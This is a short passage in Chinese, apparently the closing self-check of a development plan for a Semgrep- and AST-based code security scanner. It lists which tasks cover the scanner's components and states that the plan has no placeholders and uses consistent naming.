   - Semgrep Runner、超时、JSON 解析已在 Task 2 覆盖；
   - AST 闭包切片与污点格式化已在 Task 3 覆盖；
   - Finding 结构与 Prompt 契约在 Task 4 覆盖；
   - Fail-Closed 门禁���态机在 Task 5 覆盖；
   - Benchmark Evaluator 对接在 Task 6 覆盖；
   - 规则用例测试在 Task 7 覆盖。
2. **无占位符**：未出现 "TODO"、"TBD"、"fill in details"。
3. **类型与命名一致性**：`Finding`、`SemgrepScanResult`、`ASTScopeSlicer` 签名与字段全篇一致。
